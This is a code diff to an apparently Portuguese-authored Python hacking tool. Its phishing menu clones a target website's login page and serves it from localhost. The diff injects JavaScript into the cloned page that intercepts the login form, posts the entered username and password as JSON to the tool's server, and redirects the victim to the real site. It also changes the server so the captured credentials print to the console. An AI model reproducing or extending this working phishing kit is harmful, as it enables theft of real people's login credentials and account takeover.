@@ -7,6 +7,12 @@ import numlookupapi
 import time
 import webbrowser
 import requests
+import urllib.parse as urlparse
+import time
+import json
+import email
+import email.policy
+from io import BytesIO
 from bs4 import BeautifulSoup
 from colorama import init, Fore, Style
 
@@ -230,9 +236,6 @@ def phishing_menu(language):
             fake_login_pages(language)
         else:
             handle_invalid_option(language)
-
-
-# Função para as páginas de logins falsas
 # Função para as páginas de logins falsas
 def fake_login_pages(language):
     clear_console()
@@ -248,7 +251,6 @@ def fake_login_pages(language):
 
     clone_website(url, server_choice, language)
 
-# Função para clonar um site para login falso
 def clone_website(url, server_choice, language):
     clear_console()
     if language == '1':
@@ -263,20 +265,46 @@ def clone_website(url, server_choice, language):
             # Parseando o conteúdo com BeautifulSoup
             soup = BeautifulSoup(response.text, 'html.parser')
 
-            # Salvando o HTML e CSS
-            html_content = soup.prettify()
-            css_content = ''  # Lógica para extrair o CSS da página
+            # Inject the capture script into the cloned HTML
+            script = """
+            <script>
+                document.forms[0].addEventListener('submit', function(event) {
+                    event.preventDefault();
+                    var form = event.target;
+                    var formData = new FormData(form);
+                    var xhr = new XMLHttpRequest();
+                    xhr.open('POST', '/capture');
+                    xhr.setRequestHeader('Content-Type', 'application/json');
+                    xhr.onload = function() {
+                        window.location = '""" + url + """';
+                    };
+                    var object = {};
+                    formData.forEach((value, key) => object[key] = value);
+                    xhr.send(JSON.stringify(object));
+                });
+            </script>
+            """
 
-            # Salvar HTML e CSS em arquivos locais
+           # Inject the script before the closing </body> tag, or inside <head> if <body> is None
+            if soup.body:
+                soup.body.append(BeautifulSoup(script, 'html.parser'))
+            elif soup.head:
+                soup.head.append(BeautifulSoup(script, 'html.parser'))
+            else:
+                # Adiciona a tag <head> se não existir
+                head_tag = soup.new_tag('head')
+                soup.insert(0, head_tag)
+                head_tag.append(BeautifulSoup(script, 'html.parser'))
+
+            html_content = soup.prettify()
+
+            # Save the HTML and CSS content locally
             with open('index.html', 'w', encoding='utf-8') as html_file:
                 html_file.write(html_content)
 
-            with open('styles.css', 'w', encoding='utf-8') as css_file:
-                css_file.write(css_content)
+            print("HTML downloaded successfully!")
 
-            print("HTML and CSS downloaded successfully!")
-
-            # Continuar com a execução no servidor selecionado (apenas localhost implementado)
+            # Continue to run the selected server (only localhost implemented)
             if server_choice == '1':
                 run_local_server(url, language)
 
@@ -286,7 +314,6 @@ def clone_website(url, server_choice, language):
     except Exception as e:
         print(f"Error cloning website: {e}")
 
-# Função para executar o servidor local para phishing
 def run_local_server(target_url, language):
     clear_console()
     if language == '1':
@@ -294,20 +321,16 @@ def run_local_server(target_url, language):
     else:
         print("Executando site de phishing em localhost...")
 
-    # Configurar o servidor HTTP local para servir os arquivos clonados
+    # Define the request handler
     class PhishingServer(http.server.BaseHTTPRequestHandler):
-        def __init__(self, *args, **kwargs):
-            super().__init__(*args, **kwargs)
-
         def do_GET(self):
-            # Servir arquivos index.html e styles.css
             try:
                 if self.path == '/':
                     self.path = '/index.html'
                 elif self.path == '/styles.css':
-                    pass  # Lógica para servir o arquivo CSS
+                    pass  # Implement logic to serve the CSS file
 
-                # Abrir e enviar o arquivo solicitado
+                # Serve the requested file
                 with open(os.path.join('.', self.path[1:]), 'rb') as file:
                     self.send_response(200)
                     if self.path.endswith('.html'):
@@ -321,13 +344,14 @@ def run_local_server(target_url, language):
                 self.send_error(404, 'File Not Found: %s' % self.path)
 
         def do_POST(self):
-            # Capturar dados do formulário POST
+            # Capture the form data from POST request
             content_length = int(self.headers['Content-Length'])
             post_data = self.rfile.read(content_length).decode('utf-8')
-            username = post_data.split('&')[0].split('=')[1]
-            password = post_data.split('&')[1].split('=')[1]
+            data = json.loads(post_data)
+            username = data.get('username', '')
+            password = data.get('password', '')
 
-            # Exibir credenciais no console
+            # Print the credentials to the console
             if language == '1':
                 print(Fore.GREEN + Style.BRIGHT + "Credentials entered:".center(50))
                 print(f"Username: {username}")
@@ -337,13 +361,13 @@ def run_local_server(target_url, language):
                 print(f"Nome de Usuário: {username}")
                 print(f"Senha: {password}")
 
-            # Redirecionar para a URL digitada após capturar as credenciais
+            # Redirect to the target URL after capturing the credentials
             self.send_response(302)
             self.send_header('Location', target_url)
             self.end_headers()
 
     try:
-        # Iniciar o servidor em uma thread separada
+        # Start the server in a separate thread
         server = socketserver.TCPServer(('localhost', 8080), PhishingServer)
         server_thread = threading.Thread(target=server.serve_forever)
         server_thread.daemon = True
@@ -356,17 +380,16 @@ def run_local_server(target_url, language):
 
         input("\nPress Enter to stop the phishing server and continue...")
 
-        # Após capturar as credenciais, parar o servidor
+        # After capturing credentials, stop the server
         server.shutdown()
         server.server_close()
 
-        # Limpar os arquivos HTML e CSS
+        # Clean up the HTML and CSS files
         clean_up_files()
 
     except Exception as e:
         print(f"Error running local server: {e}")
 
-# Função para limpar os arquivos HTML e CSS
 def clean_up_files():
     try:
         os.remove('index.html')
